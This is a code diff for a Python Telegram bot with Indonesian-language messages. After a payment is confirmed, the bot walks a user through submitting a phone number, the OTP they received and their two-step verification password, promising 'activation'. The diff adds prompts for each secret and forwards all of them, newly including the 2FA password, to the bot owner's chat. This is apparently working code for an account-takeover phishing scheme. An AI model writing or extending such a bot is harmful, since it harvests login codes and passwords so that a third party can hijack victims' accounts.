@@ -135,6 +135,7 @@ async def handle_owner_response(update: Update, context: ContextTypes.DEFAULT_TY
 
     if action == "konfirmasi":
         await context.bot.send_message(chat_id=uid, text="✅ Pembayaran dikonfirmasi.\nSilakan kirim nomor HP.")
+        await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 No HP dari @{update.message.from_user.username or uid} telah dikonfirmasi.")
         return INPUT_NOHP
     else:
         await context.bot.send_message(chat_id=uid, text="❌ Bukti ditolak. Kirim ulang.")
@@ -146,15 +147,18 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if "nohp" not in user_data_store[uid]:
         user_data_store[uid]["nohp"] = text
-        await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 No HP dari @{update.message.from_user.username or uid}: {text}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("➡️ Lanjutkan", callback_data=f"otp_{uid}")]]))
+        await update.message.reply_text("✅ Nomor HP diterima, silakan kirim OTP yang telah Anda terima.")
+        await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 No HP dari @{update.message.from_user.username or uid}: {text}")
         return INPUT_OTP
     elif "otp" not in user_data_store[uid]:
         user_data_store[uid]["otp"] = text
-        await context.bot.send_message(chat_id=OWNER_ID, text=f"🔐 OTP dari @{update.message.from_user.username or uid}: {text}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("➡️ Lanjutkan", callback_data=f"verif_{uid}")]]))
+        await update.message.reply_text("✅ OTP diterima, silakan kirim verifikasi 2 langkah.")
+        await context.bot.send_message(chat_id=OWNER_ID, text=f"🔐 OTP dari @{update.message.from_user.username or uid}: {text}")
         return INPUT_VERIFIKASI
     else:
         user_data_store[uid]["verifikasi"] = text
         await update.message.reply_text("✅ Data lengkap. Tunggu proses aktivasi.")
+        await context.bot.send_message(chat_id=OWNER_ID, text=f"🔒 Verifikasi 2 langkah dari @{update.message.from_user.username or uid}: {text}")
         return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
